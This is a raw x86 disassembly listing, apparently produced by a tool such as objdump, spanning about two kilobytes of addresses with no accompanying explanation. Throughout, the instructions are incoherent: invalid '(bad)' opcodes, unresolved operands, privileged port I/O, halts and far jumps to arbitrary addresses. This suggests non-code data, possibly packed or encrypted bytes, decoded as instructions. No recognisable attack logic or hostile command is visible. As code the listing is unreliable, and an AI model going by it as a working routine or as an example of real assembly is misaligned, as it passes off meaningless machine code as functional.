  4120af:	push   edx
  4120b0:	retf   
  4120b1:	call   0x83fa:0x68369f5
  4120b8:	sbb    BYTE PTR [edi-0x7264510f],bl
  4120be:	out    dx,ax
  4120c0:	test   dl,0x1b
  4120c3:	in     eax,dx
  4120c4:	fild   QWORD PTR [esi+0x43]
  4120c7:	pop    eax
  4120c8:	and    eax,0x1a474a56
  4120cd:	or     eax,0x7a6570d4
  4120d2:	add    ebx,ebx
  4120d4:	inc    eax
  4120d5:	inc    esi
  4120d6:	imul   esi,DWORD PTR [ebx-0x7fa6a401],0xffffffc5
  4120dd:	and    eax,0x35548acf
  4120e2:	push   0x41ce6859
  4120e7:	rcr    DWORD PTR [ecx+ebx*2+0x3d221180],cl
  4120ee:	mov    edi,0x9aa65dcb
  4120f3:	xchg   ebx,edx
  4120f5:	out    dx,eax
  4120f6:	xchg   esp,eax
  4120f7:	mov    ebx,0x522c0605
  4120fc:	jns    0x4120e0
  4120fe:	inc    ecx
  4120ff:	push   ebp
  412100:	add    BYTE PTR [edx+ebp*8-0x420b1b],0x6a
  412108:	arpl   WORD PTR [eax],sp
  41210a:	fild   DWORD PTR [edx-0x79]
  41210d:	mov    DWORD PTR [esi+0x5a63835f],eax
  412113:	shl    BYTE PTR [ebx+0x1],0x55
  412117:	jbe    0x41210c
  412119:	adc    dh,BYTE PTR ds:0xa60c305c
  41211f:	aas    
  412120:	dec    edx
  412122:	int3   
  412123:	ror    DWORD PTR [ebp+0x1a],0x15
  412127:	sub    eax,0xb30ac746
  41212c:	retf   
  41212d:	jnp    0x4120f5
  41212f:	je     0x4120d6
  412131:	adc    eax,0xf6fdc6b
  412136:	push   ebx
  412137:	mov    edi,DWORD PTR [eax]
  412139:	cmp    DWORD PTR [edx+0x66fff761],edi
  41213f:	mov    edi,0x9827529d
  412144:	out    dx,al
  412145:	push   ds
  412146:	lds    esi,FWORD PTR [edi+0x590f6712]
  41214c:	out    0x8c,eax
  41214e:	push   ds
  41214f:	fld    TBYTE PTR [eax+0x17]
  412152:	jmp    0x412106
  412154:	sahf   
  412155:	cwde   
  412156:	and    DWORD PTR [ecx+0x47],esp
  412159:	hlt    
  41215a:	cmp    BYTE PTR [ebp-0x3f],ah
  41215d:	dec    ecx
  41215e:	cli    
  41215f:	pop    ecx
  412160:	aas    
  412161:	outs   dx,DWORD PTR gs:[esi]
  412163:	sti    
  412164:	out    dx,eax
  412165:	adc    DWORD PTR [edx-0x28df3179],0xc
  41216c:	out    0xe0,al
  41216e:	out    dx,eax
  41216f:	push   es
  412170:	adc    DWORD PTR [eax+0x3c],0x49
  412174:	cmp    bl,dl
  412176:	push   DWORD PTR [esi]
  412178:	leave  
  412179:	data16 xor BYTE PTR [esi+edi*2],0xf3
  41217e:	push   ecx
  41217f:	neg    BYTE PTR [ebx+ebx*4-0xb]
  412183:	pop    eax
  412184:	cmp    dl,BYTE PTR ds:0xfd6b12d2
  41218a:	outs   dx,BYTE PTR ds:[esi]
  41218b:	cmp    ah,bl
  41218d:	xchg   edx,eax
  41218e:	push   0xbddf8482
  412193:	lea    eax,[eax]
  412195:	pushf  
  412196:	(bad)  
  412197:	int    0xe3
  412199:	div    DWORD PTR [ebx+0x8a6445d]
  41219f:	xchg   DWORD PTR [ecx-0x6bac8002],edi
  4121a5:	dec    ebp
  4121a6:	jecxz  0x4121d0
  4121a8:	in     al,0xb0
  4121aa:	bound  esp,QWORD PTR [esi+0x35]
  4121ad:	call   0x61c67de7
  4121b2:	mov    cl,0x20
  4121b4:	shr    ebx,0x6b
  4121b7:	xor    edx,ebx
  4121b9:	dec    edx
  4121ba:	aaa    
  4121bb:	stos   DWORD PTR es:[edi],eax
  4121bc:	std    
  4121bd:	fist   DWORD PTR es:[ebx+0x5c]
  4121c1:	mov    DWORD PTR [ebx+0x3b5ae791],ecx
  4121c7:	mov    ds:0xf4198953,al
  4121cc:	add    al,BYTE PTR [ecx-0x57034134]
  4121d2:	add    al,0x51
  4121d4:	push   edx
  4121d5:	lds    esi,FWORD PTR [esi]
  4121d7:	adc    DWORD PTR [eax+0x37],esi
  4121da:	cld    
  4121db:	cmp    ch,al
  4121dd:	add    ecx,DWORD PTR [edx-0x58f0abff]
  4121e3:	inc    ebx
  4121e4:	mov    esp,0x8f6cc79f
  4121e9:	jl     0x412171
  4121eb:	xchg   ebp,eax
  4121ec:	hlt    
  4121ed:	rol    DWORD PTR [esi-0x4f],cl
  4121f0:	push   ebx
  4121f1:	(bad)  
  4121f2:	xor    cl,BYTE PTR [eax+0x7ee5ee4e]
  4121f8:	cs shr dl,1
  4121fb:	jg     0x4121b3
  4121fd:	sub    bl,BYTE PTR [ecx+eiz*2]
  412200:	cmp    al,0xc8
  412202:	and    DWORD PTR [bx+di],0xffffffaf
  412206:	(bad)  
  412207:	xor    ah,BYTE PTR [ebp+0x85e275f]
  41220d:	push   ebp
  41220e:	in     eax,dx
  41220f:	push   ebp
  412210:	xchg   esp,edi
  412212:	imul   esp,DWORD PTR [eax-0x9],0xba4877c0
  412219:	pop    es
  41221a:	mov    dl,0x74
  41221c:	jb     0x41225c
  41221e:	sub    dl,BYTE PTR [edx+ebp*2-0x250af787]
  412225:	mov    edi,0xa03a6f2c
  41222a:	fwait
  41222b:	adc    esi,ecx
  41222d:	in     eax,dx
  41222e:	clc    
  41222f:	ins    BYTE PTR es:[edi],dx
  412230:	(bad)  
  412231:	xchg   ebx,eax
  412232:	dec    edx
  412233:	cs jmp 0x16d2:0xb31b5673
  41223b:	inc    eax
  41223c:	sub    al,0x7e
  41223e:	push   ss
  41223f:	mov    bl,0xc6
  412241:	xor    ch,al
  412243:	in     al,0x4b
  412245:	in     eax,0xaf
  412247:	leave  
  412248:	enter  0xcb80,0xfd
  41224c:	fs jge 0x4121fa
  41224f:	cmp    eax,0x4ba0dc71
  412254:	push   esp
  412255:	cdq    
  412256:	imul   esp,DWORD PTR [esi+0x64866dc1],0xffffff98
  41225d:	shr    DWORD PTR [ebx+eax*8],0x7c
  412261:	jecxz  0x4122ba
  412263:	sar    ebp,0x72
  412266:	add    eax,0x59e2e0ca
  41226b:	push   edx
  41226c:	jmp    0x19056139
  412271:	stos   DWORD PTR es:[edi],eax
  412272:	push   ecx
  412273:	int3   
  412274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412275:	inc    edx
  412276:	test   al,0x5c
  412278:	xchg   ebp,eax
  412279:	sub    al,ch
  41227b:	(bad)  
  41227c:	in     eax,dx
  41227d:	popf   
  41227e:	mov    ecx,0x6c820c49
  412283:	push   es
  412284:	push   edi
  412285:	sbb    eax,0xb1d72ffc
  41228a:	int    0x7b
  41228c:	inc    edx
  41228d:	push   esi
  41228e:	push   es
  41228f:	addr16 jbe 0x41224d
  412292:	dec    esp
  412293:	fsubr  QWORD PTR [ecx]
  412295:	mov    esp,0xb4bb8c35
  41229a:	mov    ebp,0x440ba6e8
  41229f:	sub    eax,0x78b08302
  4122a4:	push   ebx
  4122a5:	test   eax,0xeebba389
  4122aa:	push   0xffffffb4
  4122ac:	mov    edi,0x76b40e05
  4122b1:	add    dl,BYTE PTR [eax+ecx*2+0x37]
  4122b5:	adc    BYTE PTR [edi-0x1263a4ff],0x43
  4122bc:	adc    DWORD PTR [edi+0x38d52048],ecx
  4122c2:	jb     0x412262
  4122c4:	push   esi
  4122c5:	or     dh,ch
  4122c7:	and    BYTE PTR [eax],bh
  4122c9:	imul   ebx,esi,0x54b572ed
  4122cf:	sahf   
  4122d0:	loopne 0x41232f
  4122d2:	je     0x41227c
  4122d4:	fstp   TBYTE PTR [edx]
  4122d6:	scas   eax,DWORD PTR es:[edi]
  4122d7:	stos   BYTE PTR es:[edi],al
  4122d8:	pop    edi
  4122d9:	push   edx
  4122da:	ss and ecx,esp
  4122dd:	lods   al,BYTE PTR ds:[esi]
  4122de:	jmp    0xdf8e:0xbfa5c720
  4122e5:	jbe    0x412326
  4122e7:	push   0xa698995c
  4122ec:	imul   edi,DWORD PTR [edi],0x21c84bef
  4122f2:	and    DWORD PTR [ebx+0x3fecf1f8],esp
  4122f8:	leave  
  4122f9:	sahf   
  4122fa:	sub    ebp,DWORD PTR [edx]
  4122fc:	nop
  4122fd:	cmp    edi,DWORD PTR [esi+0x6f]
  412300:	sbb    eax,0x8c5202e
  412305:	out    0xb1,eax
  412307:	or     eax,0xabb3249
  41230c:	mov    dh,0x6
  41230e:	enter  0x8fb6,0x9d
  412312:	sub    bh,al
  412314:	mov    esp,0x6b896fd1
  412319:	rsqrtps xmm3,XMMWORD PTR [edi]
  41231c:	and    al,0x89
  41231e:	shr    DWORD PTR [ebp+0x7c],1
  412321:	dec    esp
  412322:	pushf  
  412323:	pop    edi
  412324:	loope  0x4122cc
  412326:	add    al,0x11
  412328:	push   edi
  412329:	jg     0x41230e
  41232b:	shr    DWORD PTR [edi-0x610bd468],cl
  412331:	xor    BYTE PTR [esi],cl
  412333:	loopne 0x412373
  412335:	loop   0x412358
  412337:	and    BYTE PTR [eax+eax*2+0x35],al
  41233b:	inc    ebp
  41233c:	retf   
  41233d:	add    DWORD PTR [esi],0x58a7af70
  412343:	ficom  DWORD PTR [esi]
  412345:	stos   BYTE PTR es:[edi],al
  412346:	lods   eax,DWORD PTR ds:[esi]
  412347:	cli    
  412348:	mov    edx,0x8358a3ea
  41234d:	mov    WORD PTR [esi-0x7a],?
  412350:	clc    
  412351:	call   0x2dcba8a4
  412356:	or     eax,0x90b25437
  41235b:	mov    eax,gs
  41235d:	cmp    eax,0x17688ed0
  412362:	mov    DWORD PTR [ebx+0x491733f5],ecx
  412368:	fimul  DWORD PTR [eax-0x27]
  41236b:	add    al,0xaa
  41236d:	cmp    ch,cl
  41236f:	mov    ah,0x14
  412371:	pop    edi
  412372:	push   esi
  412373:	ficomp DWORD PTR [ecx+0x2e]
  412376:	lahf   
  412377:	and    bh,BYTE PTR [esi+0x4f864a28]
  41237d:	xchg   esi,eax
  41237e:	lahf   
  41237f:	fs (bad) 
  412382:	mov    edx,0x6ec02fb6
  412387:	adc    eax,0x462c0f5b
  41238c:	add    BYTE PTR [ebp-0x76],al
  41238f:	out    dx,al
  412390:	inc    edx
  412391:	adc    BYTE PTR [ebx],0xff
  412394:	repz jno 0x412408
  412397:	fild   QWORD PTR ds:0x6c7f5bee
  41239d:	ret    0x5128
  4123a0:	mov    dh,0x21
  4123a2:	and    BYTE PTR [ebp+0xe],ch
  4123a5:	dec    edi
  4123a6:	xor    al,0xa5
  4123a8:	or     BYTE PTR [esi],bh
  4123aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123ab:	dec    eax
  4123ac:	call   FWORD PTR [eax+0x4c]
  4123af:	xor    eax,0xf473a7af
  4123b4:	jae    0x41233a
  4123b6:	(bad)  [ecx-0x77847b01]
  4123bc:	es jae 0x41235e
  4123bf:	arpl   WORD PTR [esi-0x5b3d38a8],di
  4123c5:	cmc    
  4123c6:	mov    dh,BYTE PTR [edx+0x2ecd650d]
  4123cc:	xor    ah,BYTE PTR [ebp+0x76]
  4123cf:	gs iret 
  4123d1:	xchg   ebx,eax
  4123d2:	mov    edx,0x5d28e2a3
  4123d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123d8:	adc    ch,BYTE PTR [ebp-0x3b]
  4123db:	mov    WORD PTR [esi+0x44931d11],es
  4123e1:	fwait
  4123e2:	cli    
  4123e3:	cs sti 
  4123e5:	mov    WORD PTR [ecx-0x24ca7aee],?
  4123eb:	cwde   
  4123ec:	xor    eax,0xd67024cc
  4123f1:	and    bl,BYTE PTR [ebx-0x5d]
  4123f4:	or     bh,BYTE PTR [edx+0x5b979aea]
  4123fa:	cs in  eax,dx
  4123fc:	push   es
  4123fd:	in     eax,0xd7
  4123ff:	hlt    
  412400:	sahf   
  412401:	xchg   ebx,eax
  412402:	(bad)  
  412403:	mov    bl,0x50
  412405:	outs   dx,BYTE PTR ds:[esi]
  412406:	inc    ecx
  412407:	dec    esp
  412408:	and    eax,0x53d9d521
  41240d:	ins    BYTE PTR es:[edi],dx
  41240e:	cli    
  41240f:	test   DWORD PTR [ecx],edx
  412411:	xor    edi,DWORD PTR [eax]
  412413:	popa   
  412414:	mov    al,ds:0xcc0d6d53
  412419:	dec    edx
  41241a:	ins    DWORD PTR es:[edi],dx
  41241b:	xlat   BYTE PTR ds:[ebx]
  41241c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41241d:	ins    BYTE PTR es:[edi],dx
  41241e:	shl    DWORD PTR [eax],cl
  412420:	add    BYTE PTR [eax-0x4e6bd8fd],ch
  412426:	mov    bl,0x12
  412428:	dec    ebx
  412429:	ins    BYTE PTR es:[edi],dx
  41242a:	inc    edi
  41242b:	xor    dh,BYTE PTR [eax+0x50]
  41242e:	pop    ebp
  41242f:	add    dl,BYTE PTR [edx-0x4b7b7718]
  412435:	pop    edi
  412436:	in     eax,dx
  412437:	dec    edx
  412438:	aas    
  412439:	ins    DWORD PTR es:[edi],dx
  41243a:	mov    cl,0x8c
  41243c:	into   
  41243d:	adc    ch,ch
  41243f:	adc    al,0xf7
  412441:	mov    edi,DWORD PTR [ebx+ebp*4]
  412444:	not    ecx
  412446:	xchg   ecx,eax
  412447:	push   cs
  412448:	ret    
  412449:	add    eax,0x7f1ab54e
  41244e:	jb     0x4124b7
  412450:	int3   
  412451:	inc    esi
  412452:	ret    
  412453:	ja     0x41242d
  412455:	and    DWORD PTR ds:0x3a0f30fb,0xf7a26fd5
  41245f:	cmp    ecx,ebx
  412461:	push   ecx
  412462:	mov    dh,ah
  412464:	outs   dx,DWORD PTR ds:[esi]
  412465:	retf   0x348a
  412468:	xor    DWORD PTR [edx+esi*2-0x68],edi
  41246c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41246d:	cmp    DWORD PTR [eax],eax
  41246f:	mov    ds:0x9559cad5,eax
  412474:	push   ds
  412475:	std    
  412476:	aad    0x48
  412478:	(bad)  [ebx+0x66]
  41247b:	xor    bl,dl
  41247d:	pop    esp
  41247e:	out    0x92,al
  412480:	xor    eax,0x4a27763
  412485:	jl     0x412413
  412487:	mov    eax,ds:0x5d238c46
  41248c:	lds    ebx,FWORD PTR [ecx+0x5bb51fbf]
  412492:	fs ja  0x41248c
  412495:	push   cs
  412496:	and    DWORD PTR [eax+0x2c8b2fe5],ebp
  41249c:	sti    
  41249d:	inc    ebx
  41249e:	repz push edi
  4124a0:	dec    edx
  4124a1:	mov    fs,eax
  4124a3:	test   eax,0xf5ba3cfc
  4124a8:	inc    ecx
  4124a9:	lea    esp,[ebx+0x7b]
  4124ac:	stos   DWORD PTR es:[edi],eax
  4124ad:	rcr    DWORD PTR [esi-0x1e],cl
  4124b0:	sub    BYTE PTR [eax+0x1654e9df],0x80
  4124b7:	mov    dl,0xe8
  4124b9:	mov    al,0xca
  4124bb:	ins    BYTE PTR es:[edi],dx
  4124bc:	xor    DWORD PTR [eax],ebp
  4124be:	nop
  4124bf:	inc    edi
  4124c0:	push   es
  4124c1:	push   ss
  4124c2:	dec    esp
  4124c3:	je     0x412453
  4124c5:	mov    ebx,edx
  4124c7:	leave  
  4124c8:	test   DWORD PTR [eax],0x56c6a19f
  4124ce:	stc    
  4124cf:	aaa    
  4124d0:	inc    edx
  4124d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124d2:	imul   eax,eax,0x858ed4b2
  4124d8:	es popf 
  4124da:	data16 adc BYTE PTR [ebp+0x7b],bh
  4124de:	sar    BYTE PTR [edx],0xf2
  4124e1:	add    esp,DWORD PTR [edi-0x24]
  4124e4:	jle    0x412480
  4124e6:	data16 mov ah,BYTE PTR [ebp*1-0x5416f269]
  4124ee:	and    ebx,DWORD PTR [edx-0x8]
  4124f1:	clc    
  4124f2:	mov    ebp,0xc3504423
  4124f7:	mov    ebx,0x85aae42f
  4124fc:	jno    0x41256c
  4124fe:	shr    DWORD PTR [ebx+0x15],1
  412501:	and    eax,0x81cb5941
  412506:	adc    esp,DWORD PTR [edx]
  412508:	pop    edx
  412509:	xlat   BYTE PTR ds:[ebx]
  41250a:	adc    ah,BYTE PTR [edx]
  41250c:	clc    
  41250d:	push   ds
  41250e:	lds    ebx,FWORD PTR [esi+edx*4]
  412511:	nop
  412512:	ss cmp bh,al
  412515:	pop    ebp
  412516:	ret    0xfd76
  412519:	jo     0x41255f
  41251b:	jns    0x41253c
  41251d:	outs   dx,BYTE PTR ds:[esi]
  41251e:	sbb    al,dl
  412520:	sbb    BYTE PTR [esi+0x5dce94ef],ch
  412526:	jne    0x41253d
  412528:	mov    ds:0x39cbc174,al
  41252d:	shl    BYTE PTR [eax+0x6e],0xf0
  412531:	bound  eax,QWORD PTR [ebp+0x3236a747]
  412537:	cmp    al,dh
  412539:	adc    al,0xc6
  41253b:	(bad)
  41253e:	cdq    
  41253f:	int    0x16
  412541:	pop    esi
  412542:	aas    
  412543:	sti    
  412544:	mov    ecx,0xbbd067cb
  412549:	push   0x1e817ea3
  41254e:	sub    al,BYTE PTR [edi+0x1d3b6a2d]
  412554:	pop    ebx
  412555:	js     0x41257c
  412557:	and    DWORD PTR [edi*1-0x73a8a058],ebx
  41255e:	std    
  41255f:	xchg   ebx,eax
  412560:	aad    0x6e
  412562:	(bad)  
  412564:	push   edi
  412565:	or     ebx,ecx
  412567:	ins    BYTE PTR es:[edi],dx
  412568:	rol    edi,1
  41256a:	daa    
  41256b:	(bad)  
  41256d:	icebp  
  41256e:	push   0xffffffe6
  412570:	jl     0x412519
  412572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412573:	xchg   edx,eax
  412574:	sbb    al,cl
  412576:	mov    eax,0x3211b987
  41257b:	addr16 dec ecx
  41257d:	adc    eax,0xb78b2e4f
  412582:	or     esp,DWORD PTR [edx]
  412584:	outs   dx,BYTE PTR ds:[esi]
  412585:	dec    esp
  412586:	(bad)  
  412587:	fbstp  TBYTE PTR [eax]
  412589:	xchg   ebx,eax
  41258a:	sub    BYTE PTR [ebp+0x29496fca],al
  412590:	arpl   WORD PTR [esp+edi*4+0x30],di
  412594:	push   ebp
  412595:	inc    esp
  412596:	mov    BYTE PTR [esi+0x22],0x8e
  41259a:	sub    edx,eax
  41259c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41259d:	not    BYTE PTR [eax+0x19]
  4125a0:	retf   
  4125a1:	cmp    cl,BYTE PTR [edi]
  4125a3:	mov    edx,0xfe50f049
  4125a8:	sub    BYTE PTR [ebp-0x571b0fa4],cl
  4125ae:	pop    esi
  4125af:	js     0x4125b5
  4125b1:	or     BYTE PTR [eax+ebx*8+0x157d759d],ah
  4125b8:	ins    DWORD PTR es:[edi],dx
  4125b9:	adc    al,0xa8
  4125bb:	sbb    eax,0xaf5d3273
  4125c0:	arpl   ax,di
  4125c2:	rol    DWORD PTR [edi-0xfabfbeb],cl
  4125c8:	ins    DWORD PTR es:[edi],dx
  4125c9:	jg     0x4125d7
  4125cb:	jbe    0x41256f
  4125cd:	xchg   edx,eax
  4125ce:	push   ds
  4125cf:	dec    esp
  4125d0:	fild   WORD PTR [ecx]
  4125d2:	(bad)  
  4125d3:	push   0xffffffd0
  4125d5:	loope  0x41261c
  4125d7:	scas   eax,DWORD PTR es:[edi]
  4125d8:	inc    eax
  4125d9:	jbe    0x41257e
  4125db:	mov    ds:0xa34fbaba,al
  4125e0:	xor    eax,0xf2612a15
  4125e5:	push   ss
  4125e6:	and    BYTE PTR [ecx+ecx*8],cl
  4125e9:	in     al,dx
  4125ea:	mov    dl,0x9b
  4125ec:	and    DWORD PTR [eax],ebx
  4125ee:	cmp    DWORD PTR [edx+0x4d90745],edx
  4125f4:	sub    bl,BYTE PTR [esi+0x6f5af1cc]
  4125fa:	test   al,0x9c
  4125fc:	(bad)  [esi+0x59]
  4125ff:	ss ss pop es
  412602:	adc    al,BYTE PTR [eax+0x70]
  412605:	imul   edi,DWORD PTR ds:[eax+0x1b],0x817af769
  41260d:	out    dx,eax
  41260e:	(bad)  
  412610:	pop    ebx
  412611:	push   edi
  412612:	fwait
  412613:	aas    
  412614:	push   0xffffffdf
  412616:	mov    al,0x36
  412618:	js     0x412606
  41261a:	ins    DWORD PTR es:[edi],dx
  41261b:	jmp    0x4125d0
  41261d:	mov    ecx,0x9abd9979
  412622:	sub    bh,al
  412624:	repnz mov esi,?
  412627:	test   DWORD PTR ds:0x3786b8b1,ebx
  41262d:	cld    
  41262e:	fisub  WORD PTR [eax-0x3e]
  412631:	or     DWORD PTR [eax],edx
  412633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412634:	and    eax,0xa14e3750
  412639:	retf   
  41263a:	pop    DWORD PTR [ebx-0x21]
  41263d:	call   0xdcc4:0xc2ae2817
  412644:	cmp    DWORD PTR [eax+0x30bbb3ba],0x37f106cb
  41264e:	pop    esi
  41264f:	mov    ?,WORD PTR [edx+0x27]
  412652:	adc    dl,BYTE PTR [ebx+0x60]
  412655:	sub    eax,0x63c7b680
  41265a:	add    eax,0xb013ce78
  41265f:	xor    al,0xa3
  412661:	mov    WORD PTR [ebp-0x4ca4f429],fs
  412667:	retf   
  412668:	push   ecx
  412669:	jecxz  0x4126bb
  41266b:	ret    0x4b69
  41266e:	inc    ebx
  41266f:	aam    0x4
  412671:	mov    dl,0xe4
  412673:	mov    eax,ds:0x5f23e82f
  412678:	retf   
  412679:	in     eax,0xad
  41267b:	add    BYTE PTR [ebx],bl
  41267d:	icebp  
  41267e:	mov    cl,0xd9
  412680:	jmp    0x412695
  412682:	jge    0x412642
  412684:	push   0x39
  412686:	or     al,0x1f
  412688:	sahf   
  412689:	cmp    eax,0xd06a6cfa
  41268e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41268f:	jo     0x4126d6
  412691:	or     edi,DWORD PTR [eax+0x46]
  412694:	mov    ecx,0xd3ffd8a7
  412699:	jmp    0x894c5a03
  41269e:	mov    bl,0x3c
  4126a0:	cwde   
  4126a1:	mov    esp,esi
  4126a3:	stos   DWORD PTR es:[edi],eax
  4126a4:	ror    DWORD PTR [esi+esi*8-0x64],1
  4126a8:	jle    0x412714
  4126aa:	(bad)  
  4126ab:	and    BYTE PTR [eax-0x6a],cl
  4126ae:	sub    ah,0x32
  4126b1:	pop    ebx
  4126b2:	and    BYTE PTR es:[ebx],dl
  4126b5:	ja     0x412733
  4126b7:	out    dx,eax
  4126b8:	fst    QWORD PTR [eax]
  4126ba:	mov    eax,DWORD PTR [ecx]
  4126bc:	and    al,0x40
  4126be:	dec    esi
  4126bf:	imul   edi,DWORD PTR [edi-0x3961b6dc],0xffffffb5
  4126c6:	imul   BYTE PTR [edi-0x23365684]
  4126cc:	inc    edi
  4126cd:	repz adc al,0xd8
  4126d0:	ja     0x412739
  4126d2:	(bad)  
  4126d3:	push   ss
  4126d4:	rol    DWORD PTR [ebx+0x4f],cl
  4126d7:	arpl   WORD PTR [ebp+0x57ac6b33],sp
  4126dd:	retf   
  4126de:	xchg   ebp,eax
  4126df:	test   al,0x74
  4126e1:	jl     0x412681
  4126e3:	pop    ebx
  4126e4:	pop    ebp
  4126e5:	jmp    0x1a0ab8f5
  4126ea:	jo     0x412686
  4126ec:	xchg   ecx,eax
  4126ed:	dec    esp
  4126ee:	jae    0x4126ff
  4126f0:	pop    ds
  4126f1:	sub    DWORD PTR [edi-0x40fa3c74],esp
  4126f7:	or     DWORD PTR [ebp-0x61],ebp
  4126fa:	jecxz  0x4126e4
  4126fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126fd:	jp     0x41275b
  4126ff:	push   0xc8e831f6
  412704:	(bad)  
  412705:	xor    BYTE PTR [eax+0x20],bl
  412708:	fisubr DWORD PTR [edx-0xf7ffe5a]
  41270e:	data16 and BYTE PTR [ebx-0x31],0x10
  412713:	retf   
  412714:	sub    edi,DWORD PTR [ecx-0x2beba90c]
  41271a:	mov    ch,0xb6
  41271c:	sbb    edx,DWORD PTR [esi+ebp*2]
  41271f:	mov    edi,esp
  412721:	stc    
  412722:	out    0x1d,eax
  412724:	xchg   ebx,eax
  412725:	sahf   
  412726:	dec    edi
  412727:	sbb    al,0x70
  412729:	inc    ecx
  41272a:	mov    esi,0xbb2e4015
  41272f:	ficomp WORD PTR [edi+0x1c]
  412732:	aam    0xb3
  412734:	cmp    al,0x91
  412736:	out    0xcc,eax
  412738:	or     ebp,DWORD PTR [ebx]
  41273a:	and    al,0xcf
  41273c:	repnz cmp edx,DWORD PTR [esi+0x9]
  412740:	std    
  412741:	fdivp  st(5),st
  412743:	mov    dl,0xa8
  412745:	xor    al,0xa4
  412747:	xor    eax,0x7da1b7e6
  41274c:	pop    edx
  41274d:	pop    ds
  41274e:	div    BYTE PTR [esi]
  412750:	dec    ebx
  412751:	adc    al,0x40
  412753:	repnz std 
  412755:	xchg   ch,dl
  412757:	(bad)  
  412758:	jmp    0x9b5c:0x47426fb6
  41275f:	pusha  
  412760:	cmp    cl,ch
  412762:	dec    ecx
  412763:	inc    ebp
  412764:	jle    0x4126f7
  412766:	and    DWORD PTR [edx+0x3a93ac7d],eax
  41276c:	std    
  41276d:	jecxz  0x412720
  41276f:	out    dx,al
  412770:	rcr    DWORD PTR [esi+0x3e96334f],1
  412776:	mov    ds:0x95085b9,eax
  41277b:	xlat   BYTE PTR ds:[ebx]
  41277c:	inc    esi
  41277d:	cld    
  41277e:	hlt    
  41277f:	mov    ah,BYTE PTR [ecx-0x2089e0de]
  412785:	adc    esi,DWORD PTR [esp+ebx*8-0x753790a1]
  41278c:	jae    0x4127ed
  41278e:	fisttp QWORD PTR [edi+0x157bb1be]
  412794:	push   esi
  412795:	pop    edx
  412796:	popa   
  412797:	aad    0x8e
  412799:	xor    BYTE PTR [edx-0x651a0280],ch
  41279f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127a0:	jns    0x412785
  4127a2:	xchg   BYTE PTR [ebp+eax*2+0x186eb55c],ah
  4127a9:	push   esi
  4127aa:	sti    
  4127ab:	push   esi
  4127ac:	inc    ebx
  4127ad:	dec    edx
  4127ae:	sbb    eax,0x255bf527
  4127b3:	leave  
  4127b4:	mov    esi,0xb9e76d45
  4127b9:	div    eax
  4127bb:	jmp    0xa4f:0x16c6f08
  4127c2:	pushf  
  4127c3:	xchg   esi,eax
  4127c4:	lock sbb eax,0xd1cd9963
  4127ca:	xchg   esp,eax
  4127cb:	push   ss
  4127cc:	jns    0x412760
  4127ce:	inc    ebx
  4127cf:	push   0x5720edca
  4127d4:	add    ebx,DWORD PTR [edx+0x48]
  4127d7:	mov    ecx,0xaa820813
  4127dc:	retf   
  4127dd:	mov    edx,0xc25cf3ae
  4127e2:	mov    ch,0x7b
  4127e4:	in     al,0x62
  4127e6:	inc    edi
  4127e7:	mov    al,0xe3
  4127ea:	dec    esp
  4127eb:	jbe    0x412796
  4127ed:	and    eax,0xb1ac835d
  4127f2:	xor    BYTE PTR [edi-0x17ff9661],dh
  4127f8:	stos   DWORD PTR es:[edi],eax
  4127f9:	je     0x41277d
  4127fb:	cmp    al,0xd3
  4127fd:	jmp    0x4127c2
  4127ff:	out    dx,eax
  412800:	fnstenv [di-0x556e]
  412805:	mov    bh,0x3f
  412807:	out    0x7f,al
  412809:	mov    dl,0x7d
  41280b:	adc    dl,BYTE PTR [edx]
  41280d:	adc    DWORD PTR [esi+0x6659146e],esp
  412813:	dec    esi
  412814:	out    dx,eax
  412815:	cwde   
  412816:	mov    dl,0xcd
  412818:	neg    DWORD PTR [eax]
  41281a:	dec    ecx
  41281b:	imul   ebx,DWORD PTR [edx-0x43],0x10
  41281f:	xchg   ebx,eax
  412820:	xchg   BYTE PTR [ecx-0x5c],bl
  412823:	xlat   BYTE PTR ds:[ebx]
  412824:	iret   
  412825:	daa    
  412826:	out    dx,al
  412827:	sbb    ah,BYTE PTR [edi]
  412829:	xchg   ebx,eax
  41282a:	mov    ah,0xa
  41282c:	shl    DWORD PTR [edx],cl
  41282e:	out    dx,eax
  41282f:	lea    esp,[ebx+0x36]
  412832:	jne    0x412808
  412834:	fwait
  412835:	and    edi,DWORD PTR ds:0xb9877c0e
  41283b:	lahf   
  41283c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41283d:	leave  
  41283e:	cmp    DWORD PTR ds:[eax+0x2e8cbbe9],eax
  412845:	and    cl,BYTE PTR [ebx+0x29]
  412848:	jns    0x4127e1
  41284a:	je     0x4127fc
  41284c:	dec    esp
  41284d:	adc    BYTE PTR [eax],cl
  41284f:	ins    DWORD PTR es:[edi],dx
  412850:	cmc    
  412851:	jbe    0x4127f1
  412853:	fmul   DWORD PTR [eax+0xa7759cd]
  412859:	jmp    FWORD PTR [eax+0x4282d974]
  41285f:	mov    edx,0xd3ac451f
  412864:	mov    WORD PTR [ebx+ebx*4],?
  412867:	neg    bh
  412869:	test   BYTE PTR [edx-0x40],0x3c
  41286d:	sbb    eax,DWORD PTR [eax]
  41286f:	shl    BYTE PTR [esi],cl
  412871:	arpl   WORD PTR [edx-0xf4ae698],ax
  412877:	pop    edx
  412878:	ins    DWORD PTR es:[edi],dx
  412879:	scas   eax,DWORD PTR es:[edi]
  41287a:	lock icebp 
  41287c:	push   esp
  41287d:	hlt    
  41287e:	in     eax,0xfb
  412880:	or     DWORD PTR [ebx+0x13bb9205],esp
  412886:	sahf   
  412887:	or     esi,DWORD PTR [esi+esi*1]
  41288a:	(bad)
  41288e:	mov    BYTE PTR [ebp+eax*1-0x60],cl
  412892:	fadd   QWORD PTR [eax-0x6e78d497]
  412898:	cwde   
  412899:	push   ds
  41289a:	les    edx,FWORD PTR [edi+0x603cc470]
  4128a0:	cmp    bl,BYTE PTR [eax-0x78db7e70]
